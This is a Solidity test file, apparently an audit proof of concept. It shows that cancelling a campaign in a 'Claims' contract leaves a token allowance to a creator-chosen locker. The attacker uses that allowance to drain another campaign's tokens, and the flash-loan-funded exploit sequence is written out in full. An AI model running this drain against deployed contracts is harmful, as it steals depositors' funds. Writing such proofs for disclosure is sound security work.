// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {vm} from "lib/Vm.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Claims, Token, Puller} from "../src/Claims.sol";

contract Proof {
    Claims claims;
    Token token;
    address honest = address(0x40E5);
    address manager = address(0xBAD);

    function setUp() public {
        claims = new Claims();
        token = new Token();
        // An honest campaign holds 1,000,000 tokens for its users.
        token.mint(honest, 1_000_000e18);
        vm.startPrank(honest);
        token.approve(address(claims), type(uint256).max);
        claims.createCampaign(bytes16("honest"), IERC20(address(token)), 1_000_000e18, address(0x10C4E5), bytes32(0));
        vm.stopPrank();
    }

    function testCancelLeavesAllowanceToCreatorChosenLocker() public {
        Puller puller = new Puller();
        token.mint(manager, 1_000_000e18); // stands in for a flash loan
        vm.startPrank(manager);
        token.approve(address(claims), type(uint256).max);
        claims.createCampaign(bytes16("mine"), IERC20(address(token)), 1_000_000e18, address(puller), bytes32(0));
        claims.cancelCampaign(bytes16("mine"));
        vm.stopPrank();
        require(token.balanceOf(manager) == 1_000_000e18, "refund");
        require(token.allowance(address(claims), address(puller)) == 1_000_000e18, "allowance gone");
        // Later: the locker pulls the honest campaign's tokens.
        puller.pull(IERC20(address(token)), address(claims), manager, 1_000_000e18);
        require(token.balanceOf(address(claims)) == 0, "claims not empty");
        require(token.balanceOf(manager) == 2_000_000e18, "manager balance");
    }
}
